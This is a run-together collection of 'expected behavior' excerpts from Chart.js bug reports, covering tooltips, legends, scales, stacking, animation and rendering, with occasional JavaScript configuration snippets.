i was trying to implement a graph to display the count of files generated in my app
every day, the count goes from 0, then keeps going until the day end
that means it should be a vertical line at the boundary of each day.
this issue is regarding the cases when multiple `chart` instances are used
arbitrary plugins work only in instances where they have been explicitly configured using the `options.plugins` section where key is a plugin name/id and the value is a configuration object
for example, having charts `chart1` and `chart2` and a plugin `plugin1` configured only within chart `chart1`, the plugin functionality won't be applied to `chart2`.
a simple workout tracker that will log information from user inputs about workout types and exercises performed, their durations, and amount of weight lifted during resistance training
the iinformation from the mongodb database that is storing workouts and the exercises thta were performed within that workout will display total durations of time spent working out, and total weight lifted for resistance training
this information is being correctly routed to the database and is being correctly sent to the page where i am rendering the chart, as indicated in my debugging tests in devtools.
the colors in the legend created by `generatelegend` should be the same as the colors in the chart
i need to draw an horizontal bar, therefore, following the documentation, i can set `indexaxis` at dataset level (or also at options level, even if not [documented yet]( #config-options)): ```javascript
{ type: \'bar\', data: { labels: ["jan", "feb", "mar", "apr", "may"], datasets: [{ indexaxis: \'y\', // <-- for this dataset ...
}] }, options: { indexaxis: 'y', // <-- for all dataset ..
my expectation is that adding `scales` configuration, the chart is shown
```javascript
{ type: \'bar\', data: { labels: ["jan", "feb", "mar", "apr", "may"], datasets: [{ indexaxis: \'y\', // <-- for this dataset ...
}] }, options: { indexaxis: 'y', // <-- for all dataset ..., scales: { y: { axis: 'x', ....
i have got a bar chart with the following configuration: ```javascript
{ type: \'bar\', data: { labels: ["jan", "feb", "mar", "apr", "may"], datasets: [{ label: \'dataset\', borderwidth: {top: 2, left: 2, right: 2}, bordercolor: "red", data: [120, 23, 24, 45, 51] }] }, options: { responsive: true, legend: { display: true }, }
} ``` i'm expecting to have a chart with the legend and the `borderwidth` that i set.
global setting for tooltips for all chart types
i would like to use the global settings to set the display of the tooltips without having to do this via the "options".
labels should come in newline

i'm expecting to store my plugin option at default level when i can and the same to register the related plugin.
this is how it works in version 2.9.3
### 2.9.3 ```javascript
chart.plugins.register(myplugin);
chart.defaults.global.plugins.test = mypluginoptions; // works

i should be able to partially define `icartesianscaleoptions.scalelabel`
this was the behavior in 3.0.0-beta
bar should start at the x-axis
the tool tip of a data point should show the x & y values of the data point.
should render charts.
each data point should show in the tooltip, the corresponding x value and not some value from the labels array.
i wanted to remove the curve on each points
i used ```tension: 0```
`npm install chart.js --save` should not install moment to node_modules

when 'showline' for the dataset is set to **false** the line and background should be removed(and vice versa) after calling **chart.update()**
something like this: ```

chart.update()

a tooltip must always show labels for all displayed chart datasets.
when i hover over a bar, the appropriate bar has a triggered hover state.
the chart should be created without errors, or the render should stop with a more clear error.
as shared into issue #7610 and implemented in codepen by @kurkle, you could create a controller without extending the class.
when i tap outside of a canvas tooltip should disappear, akin to what happens when i tap inside a canvas.
or similarly to what happens on the desktop when i move mouse away from a circle.
the minbarlength property should always take effect, no matter the minimum value on the y-scale.
data in the graph should show background colors with a prepopulated backgroundcolor[]
every bar shoud start at y = 0 and all bars (one per day) shoud have data appended <----data1-----><--------data2---------><-------data3------> (vertical in the example)
canvas should redraw when pixel size changes due to browser zoom.
user interaction does not cause clitches
the labels should not be overlapping
ticks should be `40, 70, 100`
the graphs should reflect the different data points specified.

when registering the `legend` plugin, i get the following error: ```
cannot read property 'borderwidth' of undefined at drawlegendbox (chart.esm.js:6427)
as reported into issue #7356, my expectations was to be able to use floating bars on time scale
the sample, created at that time by @kurkle , , works perfectly with chart.js 300.alpha
my expectation is also that i can define data points with x: utc, y: [0,1] and not only with dates as strings.
i'm expecting to have from `chart.defaults.legend` the defaults options for legend element.
the same for `chart.defaults.tooltips` and `chart.defaults.title`.
as written on the documentation, the "classic" style should define new chart.
when creating a simple bar chart without anything fancy, it still contains artefacts of the legend and filler plugin
get a nice error message that a scale is not registered similar to a controller message: ```
uncaught error: "bar" is not a registered controller.
implementing a simple controller which is extending a line chart, without any customization but only logging the arguments and invoking the super method, i'm expecting to have a line chart
class custom extends chart.controllers.line { initialize() { console.log("init", arguments); super.initialize(arguments); } draw() { console.log("draw", arguments); super.draw(arguments); } addelements() { console.log("addelements", arguments); super.addelements(arguments); } addelementandreset() { console.log("addelementandreset", arguments); super.addelementandreset(arguments); } removehoverstyle() { console.log("removehoverstyle", arguments); super.removehoverstyle(arguments); } sethoverstyle() { console.log("sethoverstyle", arguments); super.sethoverstyle(arguments); } update() { console.log("update", arguments); super.update(arguments); }
}; custom.id = 'myline';
custom.defaults = chart.defaults.line;
chart.register(custom);
using the following config, i would expect the tooltip to appear whenever i hover the chart: ```js chart.line(ctx, { data: { [..
some data ...] }, options: { legend: false, tooltips: { mode: 'index', intersect: false, }, hover: { mode: 'nearest', intersect: true }, ...
when you are mousing over a dataset of a pie chart, the tooltip should appear, using my custom implementation based a specific div element.
the visibility of a dataset should always been able to change with a click in the legend.
tooltipmodel.opacity == 1 and the toopltip shows
when the dataset is "filtered" by using `min`/`max`, the scaling of the y-axes should use the "filtered" dataset.
i expect the data to be **stacked on the date** of the data
two data points at the same date is expected to be stacked.
label shows fully like in 3.0.0-alpha:
the little triangle on the tooltip should look like it does on the left ![screenshot from 2020-06-26 20-57-52](
as was using version 2.9.3, the plugin, was able to change the colors of datasets when the scheme was changed at runtime.
according to the latest [documentation]( #drawing-order) i need to set a higher number in the dataset that i want to be on top of another dataset.
quoting from the example:
// this dataset is drawn below order: 1
// this dataset is drawn on top order: 2
there should only be a gridline where there is an associated label.
when hovering the canvas, the tooltip should be displaying the values of the underlying datasets
and i guess it should stick to the x axis position of the cursor.
chart dataset visibility is toggled when using the defaultlegendclickhandler = chart.defaults.legend.onclick
it should not flicker while drawing a chart on canvas.
configuring the `custom` callback on the tooltips options and logging the tooltip model, which is the argument of callback, i'm expecting to see the object.
chart should react to hover and click events
i want ot have that hover effect:
i had some problems to extend an existing controller with chart.js 3.0.
then i have tested the sample into documentation [ #extending-existing-chart-types]( #extending-existing-chart-types), changing a little as following: ```javascript
chart.defaults.myline = chart.defaults.line;
class custom extends chart.controllers.line { draw() { // call super method first super.draw(arguments); }
chart.controllers.myline = custom;
console.log(chart.controllers);
i was expecting to have a line chart.
make a chartjs object with multiple y-axis bound to a canvas node that is detached from document.body.
animation should happen, and not be affected by a mouseover event
if needed, the tooltip should wait to render until the animation has completed.
chart should animate
if you hover over one of the sections of a doughnut chart, you expect the section to become a little darker
if you are using a normal hex colour value, above expected behavior indeed happens.
here is a gif of the bar chart updating
watch the legend:
[gif of bar chart]( [here is a sandbox to review]( the expected behavior is the legend updating in sync with the graph.
v3 dev should be as fast as v3 alpha
in version 2.9.3, when you want to update a datasets with data as points (i.e.scatter), you could change the "point" object in its x and y properties.
the following code is "randomize" implementation (updated by me to show how it works in 2.9.3) of scatter chart in chart.js samples
```javascript
document.getelementbyid('randomizedata').addeventlistener('click', function() { scatterchartdata.datasets.foreach(function(dataset) { dataset.data.foreach(function(item) { item.x = randomscalingfactor(); item.y = randomscalingfactor(); }); }); window.myscatter.update();
#### **be aware** this issue was solved in 2.9.3 version (see the issue #6396).
the rendering of a radar chart works correctly with version 2.9.3

charts that are rendered when reload or new page
when user goes to another page from there clicking some link and then comes back to same page by using back button or in page link, the charts should still be visible.
when clicking to hide the last data set in a dougnut chart it should be totally hidden
the last x tick in the sample should be at the right edge of the canvas
specifying an arrow function for the `onclick` legend option should work.
mark only one point, even if they are very close
all grid lines should remain consistently the same color, as defined in the options.
the sparkline chart should be sharp
the straight line should be white.
`this.options` in the context of a `dateadapter` instance should always reflect the most recent value of `chart.options.scales.x.adapters.date` (or whichever scale is applicable).
class instances should be preserved in chart options, including instance methods.
should update/render chart when clicking through menu items
all legend items should be clickable (with toggle as default behavior) and all items should be fully visible if positioned right or left.
lines for the data sets should be visible on the line chart.
i am plotting multiple floating horizontal bars with a categorical y-axis and a time x-axis.
i expect the bars to be shown independently of the order in the dataset.
x axis tick (multiline) labels should be horizontally centered (a lines) when rotated 90 degrees.
newest version of [momentjs]( v2.25.1 should be compatible with chartjs, but it's not.
the number of gridlines should be limited even if the ticks itself are not displayed at all.
nan values should not be displayed on logarithmic graph
chart should keep its original height, just like 2.9.x version.
when i programmaitcaly change a chart type (from line to radar and back), polar and line axis stays on and conflict with each other
you can see an exemple [here](
what i would expect is that if you set the `barthickness: 2` to a higher value that the bars wouldn't overflow in each other but keep space between each other.
on a chart with different point styles for hover.
hover on a point - observe hover-in animation

expected custom tooltip to be closed when a click occurs inside as well as outside canvas.
when x-axis labels are skipped the points must be drawn at the correct position.
expected the bubbles not to be drawn outside of the chart bounds.
in real time mode (push/shift) with identical values, the line is good in 2.9.3.
sample code using custom tooltips should not report an error, this tooltips should display normally
when the canvas is inside a shadow dom and the chart is configured to display tooltips (`tooltips: {enabled: true}`), i would like the rendered chart to display tooltips when i hover over the chart with the mouse
when the color is changed in the datasets and update() is called, the bars and legend should change color.
using `unit: 'month'` for time axis should be ok whatever the data.
when a (line) chart is updated leading to an increased width of the y-axis labels, the data points on the y-axis should not be hidden during animation.
the green bars should be right on top of the red bars.
expect to see 5 equal ticks with same range value, defined in 'stepsize' property (in my case, 18)
all grid lines equally styled.
line should not cross yaxes when display is false
chart should draw the points inside the canvas and display all of them.
chart.js should not throw and break the complete application, instead it should catch the error and write an console.error-message.
when i'm using the css property zoom: 2; the hover elements of my canvas should be sync with the canvas element.
i want to have a wide line graph in a div with scroll, i would expect all points to have a line between them
i am currently using a width higher than 25000px.
bar chart should display
the graph must display the last label on x axe.
the z-index of border & point should follow the fill area
top dataset (coloured black in example) should fill down to the border of the bottom dataset (coloured red) when `steppedline: middle` is used
have the same 0 as the base line

i use a bar chart with the onclick options
when we click on a bar, the datasets of the chart are removed and replaced with others
the number of datasets is variable, we don't know, when we click, how many datasets will be shown.
the labels on the y-axis to be calculated like they are in version 2.7.3
x-axis labels visible properly
`offset` is meant to allow bar charts to render bars without getting cut off
thus it should use the location of the first and last data point
i\'m initialising an empty chart (with the intention of adding data later on) with 2 y-axes using the following code: ``` vizfit = new chart("vizfit", { type: "line", data: { labels: [], datasets: [{ label: "fitness", data: [], yaxisid: "left-y-axis" }, { label: "max nn size", data: [], yaxisid: "right-y-axis" } ], options: { scales: { yaxes: [{ id: \'left-y-axis\', type: \'linear\', position: \'left\' }, { id: \'right-y-axis\', type: \'linear\', position: \'right\' }] } } } });
``` then i'm gradually adding some data with: ``` vizfit.data.labels.push(neat.generation); vizfit.data.datasets[0].data.push(maxfitness); vizfit.data.datasets[1].data.push(maxnnsize); vizfit.update();
``` i expect the chart to update with the new data, showing ticks for the first dataset on the left axis and on the right one for the second dataset.
the chart shows data when using 45000 datapoints to create the chart.
wkhtmltopdf 0.12.5 with chartjs v2.9.3 renders the charts in the pdf
after setting the min value on y axis , values less than min value should be plotted , below y axis.
all labels on an axis, the y-axis in this example, should be stacked or overlayed on top of each other with the same vertical alignment unless otherwise specified.
hovering a specific data point, only this data point should change according to the hover effect
potentially other data points very close by can be effected as well depending on the `pointhitradius` selected.
hovering over point on line chart when legend is hidden should not update the font weight of `filltext` text.
when updating chart data, updated line should be correctly filled with background color.
`update();` should update the dataset label colour for all charts
### actual behavior the above chart types do not update the dataset label colour
### workarounds destroying and recreating the chart each time the colour changes works, but is expensive.
double calling `update();` also works! reverting from 2.9.x to chartjs 2.8.0 removes the issue
seems to me like the label colour is being set after the `update()` method has done its thing for some charts
chart.js drawing bar element without unexpected border lines
custom tooltip should render when `tooltips.custom` is passed a callback function.
y axis should be hidden/transparent/not displayed.
`nan` datapoint should be skipped (there should be gap)

dear author, i am seeing an issue with the rendering
it seems the chart will render smaller on a high definition monitor
please see images below for reference
look forward to your advise
the height is not getting adjusted.
when two points are so close together that they intersect when one is hovered, i would like the hovered one to (partially) cover the other one.
tooltip should show all the items of the dataset
#drawing-order
when i have 2 dataset with order =1 and order =2 , order 1 should be drawn below and order=2 should be on top
i expected the right border (yaxes position right) to be hidden when drawborder and drawonchartarea were set to false like on this fiddle that uses an old version of chart (2.3.0):
problem a - the line plot's 0 point should be in line with the `x-axis-1` axis's 0 line (top), but it's not.
problem b - the line plot's points must be in the mid of bars but it's not (i.e each point positioned in the middle of a corresponding bar for that label).
when resizing a page where charts are put into cols, i expect them to keep a minimal size and not grow as much as they can
drawing a main line with additional filled areas to provide context for the main line values.
the main data series point to appear at the middle of x-value area.
the filled areas are constant for each x value and step down at the end of each x-value.
the borderwidth setting at zero should be repected and there should be no visible border.
the hoverwidth setting should be applied only to the vertically hovered points and not the whole of one dataset and a partial piece of another.
plugin funnel should work as previously.
when hovering over a tooltip it is expected to show something like this
![image](
i'm showing an y-axis on the left and right side of a chart
to get the same scale on both, i set [suggestedmin and max]( #tick-configuration-options)
the data is within this range
i expect both y-axis to get the same scaling, as in 2.8.0: ![2 8 0](
on resizing the windows width, chart should be set to a certain size and stay that way.
when you use stacked:true for stacked bar chart, you expect to see stacked usage
when you use stacked:false, it should not stack the data
this is expected output:
![image](
when using stacked area chart with positive and negative data i expect to see same stacking behavior for **zero values** in data set
all zero values in data set are properly stacked even if there are negative values.
line between two data points that are 0 should keep it's border width so there's a consistent line between all data points.
with `mode: 'x'`, hovering over a point should display 1 data point from each dataset.
expected behavior as it was in chart.js 2.8.x.
`draw` method in my applycustomrenderer should get correct data in `this._model.x` and `this._model.width`
see values in the console in following codepen, there are correct float values.
labels should not clearly separated.
when tests are launched in watch mode, changes to the source code should trigger a new test run.
when you add new dataset to an existing pie chart and previously you hide a data by legend, the data at index (which should be hidden) shouldn't appear into chart.
animation rendering should reach 100%
progress measured as `progress = math.floor(animation.animationobject.currentstep * 100 / animation.animationobject.numsteps)`
updating chart in a quick setinterval with specific animation does draw the chart
on upgrade from chart.js 2.8.0 to 2.9.1, ie11 is supported so it should be able to show the samples.
minify without error
chart should display!
the display of a chart
i prepared [example project]( to reproduce the issue
using v2.8.0, ![image](
the chart fill should start in the middle and end on the chart line.
the line should start at `min` and stop at `max`, as it did in 2.8.0:
![2 8](
expectation is the chart.js is working well with ie and edge as previous version.
all points should display
when moving the mouse on a line chart, we should have a smooth animation on point hover.
no deprecation warnings when not using deprecated options.
upon changing yaxes -> gridlines -> zerolinewidth, y-axis thickness should change.
onclick event should return the correct dataset index.
using options for tooltips and hover to turn off tooltips and hover should work
run the chart drawing/update cycle only once.
in "utc+12 auckland" time zone, the dst "2019-09-29t02:00:00" should be shown correctly in the chart.
points outside of scale `min` and `max` should not be plotted
title of the first orange datapoints tooltip should be '3' (see codepen below)
title of the first grey datapoints tooltip should be '2'
when updating a chart (using `update()`) on stacked bar charts, the legend filter should not be reset.
first data of dataset 1 and last data of dataset 2 are displayed in chart
should display data and format in provided date format
the onclick function should have a non-empty data array as a parameter.
chartjs should show charts on ie 11
legend position in right top like in 2.8.0.
also like filled legend more than empty frames
allways give bar-tooltips when hover to bar.
when mouse moves along the points in scatter chart, the active point must be highlighted to represent the one that is in tooltip
tooltips should be combined on the origin of radar in tooltip 'index' mode for all axes
when hovering over a point on the shorter xaxis scale, the incorrect point is selected on the other xaxis
hi there, i would like to separete datasets in 2 different stacked group using stack property option
i use a stacked bar chart and `xaxis.type` is `time`
i expect bars to be stacked when on the same `t` value (the data looks like `{t: new date( ), y: }`
if some data point is the only one at that time i expect no stacking
i also expect the bars of the datasets to have the same width.
i use `type: 'time'` and `distribution: 'series'` as options for an x-axis (`options.scales.xaxes`) in a line chart
i then add data of the following type: `{t: new date( ..
}`, where there is a gap in time (see pic below)
i expect the tick marks to look nice at this point.
charts should plot successfully, even when ticks are small
line chart will be displayed in full from the first (left) to last (rightmost) data point.
the default tooltip should be large enough to contain the whole text, without breaking or overflowing.
to draw the graph with "2019-03-10t02:00:00" on the x-axis with the other values also visible
the rendering of a radar chart works correctly with version 2.8.0.
radar chart is cutted from top and bottom when there are points outside the scale
as you can see in the provided codepen i have set the scale `` ticks: { min: 0, max: 100, stepsize: 25, display: false },
`` but i also have some points outside the scale and the whole plot is cutted from the top and bottom
setting fixed height and width does not solve the problem
the plot is always cutted.
tooltip legend squares should have the same colour as the bars.
using a function to dynamically return a background color for pie graph data points, should also color the legend items correctly
## current behaviour
legend item's color remains default grey while the sections of the pie graph are colored properly.
if `time.parser:"x"` time data would be parsed as unix timestamp in seconds
setting the `chartconfig.options.legend.labels.fontsize`-property tries to cast strings to integers for consistent behaviour with other `fontsize`-properties.
i expect the x/y coordinates of bars to be set correctly regardless of whether the bar is visible or not.
custom tooltip function executes when mouse leave chart element.
chartjs working fine on many machines, including affected pc, however a bug triggered in chrome/brave where all labels and ui elements are overlapping, and clear cache/reload does not fix it
affected machine which worked fine now is maintaining this bug.
/ current behavior
on the attached images you can notice that when hovering on one of the dots - it activates with the 'active' colour all of the bottom ones, on the other image is the expected behaviour which works on all dots without the last one.
two icons must be shown on both chrome and firefox
after calling update() on a consistent chart configuration with an additional unused axis i would expect the datasets to be displayed on the correct axes.
y-axis scales should be shown
should work and show chart
chartjs should honor the time.parser option and display for example "8:54 uhr" on the x-axis.
step size sets in a configuration like:
ticks: { max: 16.1, min: 14.1, step: 0.5,
settings applys to chart
user see steps 14.1, 14.6, 15.1, 15.6, 16.1 on screen.

chart shall render properly on mobile and scroll should work.
when plotting a line graph, lines should be drawned.
clearing a chart twice => everything works fine
updating the chart aspect ratio option and calling `update()` should change the graphs aspect ratio.
i would expect that either 't' (the object on which measuretext is called) or the result of measuretext would be _null-checked_ before using it.
the tool tips should show on the right hand side of the cursor
the polar area chart should render with enough top and bottom margin to include the entire chart and labels.
will not generate additional padding
bars should be a minimum height to be visible when value = 0.
it should be possible to initialize a chart with an empty dataset and then immediately populate it afterward.
for the background to not overlay the line of the other dataset.

the expected behaviour is that the chart correctly generates axis ticks when using a date as an axis based on the provided data set
if the difference between the data points is in the magnitude of days, the chart's axis should reflect that.
when i am creating chart with all negative data array i.e
datasets = {
label : 'abc', xyz,
data: [-1, -2]
``` i should be able to see chart.
setting `borderwidth` with an object should make it possible to set the width of the bottom border on a **bar chart**.
doughnut chart analogous to underful segment
the expected behaviour is that the chart correctly generates axis ticks when using a date as an axis based on the provided data set
if the difference between the data points is in the magnitude of days, the chart's axis should reflect that.
when running the project, during the compilation phase, the .js file is created and minimized.
i used the chart.js sample of doughnut and i used patternomaly to create canvas pattern
this is what i'm expecting: ![correct]( this is the code of scriptable options : ```javascript
backgroundcolor: function(context) { var index = context.dataindex; if (index === 0){ return pattern.draw('square', '#ff6384'); } if (index === 1){ return pattern.draw('circle', '#36a2eb'); } if (index === 2){ return pattern.draw('diamond', '#cc65fe'); } if (index === 3){ return pattern.draw('triangle', '#ffce56'); } return pattern.draw('zigzag', '#fcc465');
diagram shown.
labels should be skipped or rotate so they are not overlapping.
there should be no gaps between single bar fragments.
<img width="406" alt="screen shot 2019-02-26 at 2 55 36 pm" src=" ">
all data-points (circles) should be displayed.
line chart should not wrap around the canvas.
the connecting line should be drawn between data points
should get bar chart with horizontal scroll **
the `onresize` callback doesn't fire when the document (_body_) has the direction set to `rtl`.
this affects responsiveness as well, since the chart doesn't scale correctly when the `responsive` option is set.
i expect that if i use chart.options.onclick, that the onclick functon works on the chart, and not the whole canvas
i would like to define the backgroundcolor with hex format and alpha value #rrggbbaa
the graph should use this color, as well as the tootltip
a bar is expected to have the zero-line as one of the borders
i should be able to use `window.addeventlistener` as normal.
when having a scatter plot with points of which the y-values are extremely close to each other, the y-axis should at least show something, and points should not disappear entirely
maybe there is a limit to which the y-axis can zoom or something, but it should not go away.
proper scaling and responsiveness when resolution changes
`maxtickslimit` should limit the number of ticks.
enabling the anglelines for a polararea type chart should draw anglelines that align with the borders of a data segment.
canvas should resize to allow space for labels, labels should not overlap.
a chart with `type: "time"` axis should render properly, also when packed as a firefox extension
here's how it should look, as it does in chrome: ![chrome](
the expected behaviour is to display properly the x axis labels
expect that 0 value bars to be minimal och nonexistent.
when i use `patternomaly` to generate pattern for the `backgroundcolor` and the `hoverbackgroundcolor`, the color in the tooltip when you hover above the chart should show the actual color
or maybe be able to show the color without the pattern on top of it?
when target element for chart is inside anchor tag, chart should render normally.
the canvas fits the container without expanding it
setting the `elements.point.hoverborderwidth` configuration setting in the defaults for a graph type should have an effect.
the bar chart should resize when the window size is changed.
when duration:0 is set, the width and height is calculated and instantly applied, as opposed to animating from 0 height
when the user toggles the data shown in the line chart by clicking the legend items, the toggle setting is kept even as new data flows into the chart.
* add `pointer-events:none` to the `<canvas>` element
* the canvas should not react to hover or click events
tooltip should show actual dataset value.
i expect usual hover animations of 400ms to apply
time axis ticks are properly generated
if time range is longer than several days, then date should appear instead of time on x-axis
like in all browsers, it should just not apply the styling and still display the chart
if the value is wrong, an error message would be useful.
specifying a number array for `gridlines.linewidth` should result in the corresponding grid lines being drawn at the individually specified line widths.
create a stacked bar using time axis with different datetime in the datasets
for example: ```
datasets: [ { label: \'a\', data: [ { x: "01-01-2018", y: 12 }, { x: "02-01-2018", y: 15 }, ], }, { label: \'b\', data: [ { x: "02-01-2018", y: 23 }, { x: "03-01-2018", y: 34 }, { x: "04-01-2018", y: 45 }, ] } ],
in this example dataset b haven\'t the point at "01-01-2018"
the linear chart should maintain the graph's aspect ratio when its size is low (e.g
a little chart preview as shown in this website: coinranking com).
stepsize should be considered from the min value
for the tooltip to make sense in mode _dataset_, the information should be displayed differently:
> [color box] dataset label
> first label: value 1
> second label: value 2
> nth label: value n example from link below (hovering point of "my second dataset" in "april")
> [blue box] my second dataset
> january: 7
> february: 49
full data should be displayed for all the possible widths & screen resolutions.
offset should work even if `time.min` and `time.max` are set.
in a shadow dom and shadowroot, chart.js should work properly.
grid lines should be equally spaced thus values shown under x axes should be [0, 1.3, 2.6, 3.9, 5.2, 6.5, 7.8, 9.1, 10.4, 11.7, 13] as max is 13, min 0 and stepsize 1.3 here's a working example having stepsize 0.9 instead:
i expect to see a single thin vertical line, regardless of screen/window size
all edges should be visible.
i know that the *time* axis is not a *duration* axis, so the case should never happen
but if it happens, that would be nice if we had an error/warning in the console and maybe a degraded behavior instead of the browser freezing :stuck_out_tongue:
* keep showing the bar even if it's too small
line plot with linear x/y axes should work correctly on latest version.
chart has inherited background color.
i would expect the bar for each day to be fully visible in the bar chart.
chart.options.scales.yaxes[0].ticks.fontcolor is able to update bar chart y axes ticks font color.
the tick marks should be before the label
see below screenshot from v2.7.1
![image](
it should snap back to normal size when the browser maximizes
steps to have decimal values: [0, 2.5, 5, 7.5, 10]
i expect the chart to just stay visible when switching between browser tabs.
when using `options.legend.labels.usepointstyle` the color and style applied isn't 100% equal
points should look the same here as on the graph itself.
when i pass my cursor over a bar, the bar is highlighted.
chart and legend not colliding.
the animation should execute without a flicker.
animation should last for 10 seconds in any browser.
the scale behaves as it does with values larger than 1 and/or when there are multiple values
## actual behavior
the scale distorts to include the range -0.6 to 1.4
i'm using a bar chart with manually specified grid lines
they should be displayed as it was before 2.7.2.
with 2.7.1 it displays such as:
![image](
all bars should be drawn on canvas and visible.
match the parameters.
data should be drawn in correct order when described like {x: , y:} even if some data is missing
like this example: [correct](
it should be possible to provent the ticks and pointlabels from colliding
a way to do this without breaking backwards compatibility would be to set padding at options.scale.pointlabels.padding.
in chrome the graphic works perfectly.
stacked bar chart should accept datasets where the stacks are unsorted, e.g
(stack 1), (stack 2), (stack 1), instead of sorted, e.g
(stack 1), (stack 1), (stack 2).
tick labels can be passed as an array of strings to be represented as multiple lines on a chart
it is expected that the label is then centered vertically to the bar's position.
chart.js should not depend on the the `content-security-policy: style-src 'unsafe-inline'` directive.
create a multi-axis overlayed chart in horizontalbar mode
i think this is a bug, the docs say it should work
however, looking at the code, i see no es6 export.
![expected scale behavior](
please have a look at the attached drawing.
![image](
when creating a chart with a min & max time specified but without setting unit, the unit should be inferred correctly in the same way as when min & max are not set.
view an animation when the page is loaded
i would expect `zeroline` attributes (e.g
`zerolinewidth`) to be set on the yaxis
tooltip move back and forth smoothly when moving mouse pointer between bars
no error occurs.
changing the type and update() should change the display type
no points cut regardless of a title presense
" if these are set to an array value, the first value applies to the first bar, the second value to the second bar, and so on."( the example with chartjs version 2.6.0: ![image](
the data point for 2017-01-17 18:00:00 should be charted before the tick for 2017-01-18
disabling color boxes and title in tooltips via displaycolors and returning an empty string in the title callback should not interfere with the tooltip body font color.
when a [custom tick format]( #creating-custom-tick-formats) callback returns null, that tick should be removed from graph.
should be able to see items on all sides of the chart, as it was working in v2.6:
<img width="576" alt="v2_6" src=" ">
i have a issue with resize event
i have a dropdown of 3 types of charts and bydefault one is selected
i read documentation and apply in my charts
when i use resize event of window is working fine fisrt time
graph height and width is updated
but if i select another type of graph and resize window then graph height and width is not updated
i used `responsive: true,` `maintainaspectratio: false,` in my chart options.
exceptions either pop up outside or are catch inside the library
should be able to see the word "may"
only the number of tick lines specified should show, or at least something readable should render.
all points should fully get displayed
work properly, display properly
the line should be smooth.
no problems when rendering a bubble chart with one single point
when setting time.min and time.max, the scale should be bounded by those values and data points outside that range should be hidden
it should behave as the scatter chart (shown in the example).
area between lines should be filled without overruns or leaving unfilled area.
the return of the correct point values when clicking on them
a chart should render whether labels have been assigned or not
at the very least, having to explicitly add a labels array with at least one empty element should not be required in order to get a chart to render.
based on [the documentation]( for lines charts, i should be able to give an array of color.
if we made strong zoom then some curve exceed the chart and be hidden which is normal but the data set should disappear same like curves.
[see image](
when a series of bars has a single missing point, remaining bars should have equal width and be centered at their x or t location.
all bars should be drawn
if a data point has a wrong time format, it should be taken out.
when the canvas container has `style="display: none;"` then later on set to `block` using js, used with the chart option `maintainaspectratio: false`, the chart should be the same size as without the complications with `display: none`.
line and scatter charts allow you to put a null into the data point as a missing value
bubble charts should presumably do the same.
![good](
in internet explorer 10 and 11 the lines should be rendered
entirety of axis labels should be visible.
the width and height of the chart can dynamic changed and the chart can display
i want to have a stacked value and i have a bug
i thinks this 2 bug are linked
all data point should display on the chart
<img width="479" alt="2" src=" ">
in the example above, i expect a trapezoid shape graph that spans 6:00:01.3 pm to 6:00:01.5 pm.
grids should fit into the pane, and x-axis should start at 0.
frames must have unique title attribute
when it works normally : ![image](
a nicely displayed bar chart with dates in abscissa
chart should not break page
fill area should be drawn inside the chart area.
show full yasix label.
the code below should work
```javascript
var ctx = document.getelementbyid('mychart').getcontext('2d');
var chart = new chart(ctx, { type: 'bar', data: { labels: ['1', '2', '3'], datasets: [{ data: [0, 2, 4] },{ data: [1, 3, 5] }] }
}); chart.data.datasets.shift();
chart.data.datasets[0].data.shift(); // ---(1)
chart.update();
currently while using a pie chart with `responsive: true` in a bootstrap modal and using reactjs.net (or any collapsible element in html5 by my reckoning) i experienced a bug where the pie chart in a grid would become broken when re-rendered in a hidden modal
before i go any further yes i know reactjs has a charts wrapper called react-chartjs but using react components in reactjs.net is hard and as far as i can tell charts.js works fine beyond this bug i found
here is the modal before i search my list of modals:
![working]( the canvas is in a `<div class="col-sm-4">` wrapper element
the same goes for the bootstrap panels next to it
i would expect this behavior to remain constant but when i used a reactjs search feature to filter out my list of modals and then reopen a modal the below behavior is encountered.
**bugs :** - **issue#a** : it should be **smooth** when **moving mouse** (+ touch on mobile)
- **issue#b** : it should **disapreared tooltips** when touch end (**mobile**) (or wait some secs before disapreared, possible while api ?) ![dkpiebhfkj]( **test / demo :**
the line chart xaxis should display date values with a difference of 5 minutes, when unitstepsize is 5 and unit is "minute".
should not crash the browser? duh
i have 3 series in a bar chart
2 series have the same `stack` id so that they are stacked together into one bar
thus i'm expecting to see 2 bars: 1 bar alone and one bar composed of two stacked series
this works most of the time
all labels should be visible at any given time.
scatter plot should look like a grid of circles, or symbols.
when i update the data of the chart and call `chart.update()`, the chart animates to the updated state and the tooltip should be animated to the position that would correspond to the updated data state.
chart.js should be optimized for performance
works as 2.5.0
the space between the two datasets are filled.
rounding was working in 2.5.0
the duration of the hover animation should be the one provided in `options.hover.animationduration` instead of `animation.duration`.
when using `chart.defaults.global.defaultcolor` to specify a new default color for all charts, the new default color you specify should overwrite the initial one of `'rgba(0, 0, 0, 0.1)'`.
the provided function should be called when the mouse hovers a segment of the chart.
user should be able to manually set the spacing (or label's `lineheight`?) between lines inside a multi-line label
* chart.js version: 2.5.0 (tho older versions yield the same result)
expect chart.js to not cause logs in dev console
for the hover tooltip to show without throwing any errors when using a pattern as a background color with the help of patternomaly.js as suggested in the documentation at #chart-configuration-patterns
the example should show a straight diagonal line as days go up by one, and the value goes up by one.
chart should show min and max that was set on the configuration then plot the line between them with a equal size of steps.
should display chart
bars shouldn't overlap each other.
line chart to display the whole line with same width
be able to call `chart.update()` after setting new options related to scales.
**callback** parameter in **ticks** should be called single time while creating chart instance.
lines and points to render correctly
it should handle failing to add listeners to a frozen array
to just show the 6pm as the last x axis tick i have a set of labels showing time going from 6am to 6pm, but the graph show an extra 7pm
when two points are near each other and the user hovers his or her cursor inside the common area of the two, the closest point to the user's cursor should be set to the hover state and the tooltip should be aligned with this point
take the example below, which is running on v2.3.0, and shows the tooltip and hover point aligning **correctly**
the cyan-colored line above is just for reference
sorry that the mouse cursor is not appearing
<img src=" " alt="2017-04-06_11-46-33" width="300">
resizing a pie chart with padding should shift and resize all legend items so that they remain visible.
applying left and right padding should only apply padding to the left and right sides of the chart.
chart need to render in chrome and ie11.
horizontal bars mix with line
in mozilla firefox, listening to canvas elements (like mousemove, on click) with a debounce function, the **getelementatevent()** function should return an element if for example the user mouse hover a point or a bar in the chart.
when setting options to`options={ responsive: true, maintainaspectratio: false, }` and placing the canvas inside of a dedicated container with relative positioning `width: 100vw; height: 50vh` i expect the chart to be as wide as the screen and half the height of the window, even after a resize
i also expect that when i destroy and place a new chart on the same canvas that the new chart will also have the same dimensions and respond correctly to a resize
- "pointradius" is used to draw the circle when not in mouse-over mode.
- "pointhitradius" is used for all mouse-over events, including the tooltip.
chart should be drawn even with `linearc` set to `true`.
